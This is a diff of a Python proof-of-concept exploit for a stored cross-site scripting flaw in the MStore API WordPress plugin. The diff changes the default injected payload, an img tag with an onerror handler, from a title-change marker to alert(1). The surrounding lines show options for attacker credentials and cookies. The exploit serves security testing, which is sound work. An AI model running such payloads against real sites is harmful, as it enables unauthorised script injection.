@@ -40,10 +40,7 @@ import urllib.parse
 import urllib.request
 from http.cookiejar import CookieJar
 
-DEFAULT_PAYLOAD = (
-    '<img src=x onerror="document.title=String.fromCharCode(88,83,83)" '
-    'data-mstore-poc="1">'
-)
+DEFAULT_PAYLOAD = '<img src=x onerror="alert(1)" data-mstore-poc="1">'
 DEFAULT_MARKER = "data-mstore-poc"
 USER_AGENT = "MStore-API-Stored-XSS-PoC/1.0"
 
@@ -334,7 +331,7 @@ def main() -> int:
     parser.add_argument("--username", help="Attacker WordPress username (Subscriber+).")
     parser.add_argument("--password", help="Attacker WordPress password.")
     parser.add_argument("--cookie", help="Existing attacker auth cookie (skips login).")
-    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="Comment payload (default: benign title-change marker).")
+    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="Comment payload (default: <img src=x onerror=\"alert(1)\"> with a marker).")
     parser.add_argument("--meta", default='{"rating":5}', help="Value for the comment meta JSON (default: {\"rating\":5}).")
     parser.add_argument("--marker", default=DEFAULT_MARKER, help="String used by --check to detect the payload.")
     parser.add_argument("--admin-user", help="Admin username for automatic approval (lab/testing only).")
